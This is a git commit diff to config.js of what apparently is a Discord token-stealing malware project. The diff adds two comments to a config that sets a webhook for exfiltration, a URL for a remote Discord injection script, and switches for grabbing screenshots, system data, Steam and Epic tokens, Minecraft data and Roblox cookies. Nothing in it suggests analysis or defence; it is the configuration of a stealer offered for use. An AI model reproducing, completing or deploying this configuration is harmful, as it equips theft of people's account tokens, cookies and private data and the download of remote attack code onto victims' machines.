488c72d051864028e679db7e4798e5c054c4476c
Exponent <103051123+Rdmo1@users.noreply.github.com>
2022-09-08 17:38:57 +0800

    Update config.js

--- config.js
+++ config.js
@@ -4,12 +4,16 @@
     "webhook": "WEBHOOK HERE",
     "discord_id": "ENTER YOUR DISCORD ID",
     "server_id": "ENTER YOUR SERVER ID",
+
+   // you can change this if you have your own!
+
     "injection_url": "https://raw.githubusercontent.com/addi00000/Discord-Injection/master/injection.js",
 
     "grab_system": "false", 
     "grab_screenhot": "false",
     "grab_steamtoken": "false",
 
+  // set to "true" and "false" only!
     "grab_epictoken": "false",
     "grab_minecraft": "false",
     "grab_robloxcookie": "false",
